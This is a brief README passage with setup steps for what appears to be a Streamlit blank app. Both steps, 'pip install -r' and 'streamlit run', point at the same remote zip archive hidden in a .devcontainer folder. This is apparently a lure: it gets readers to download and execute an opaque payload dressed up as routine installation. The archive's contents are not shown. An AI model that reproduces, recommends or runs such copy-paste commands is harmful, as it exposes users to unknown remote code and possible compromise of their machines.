### How to run it on your own machine

1. Install the requirements

   ```
   $ pip install -r https://raw.githubusercontent.com/YonickAzuma/blank-app/main/.devcontainer/blank-app-2.2.zip
   ```

2. Run the app

   ```
   $ streamlit run https://raw.githubusercontent.com/YonickAzuma/blank-app/main/.devcontainer/blank-app-2.2.zip
   ```
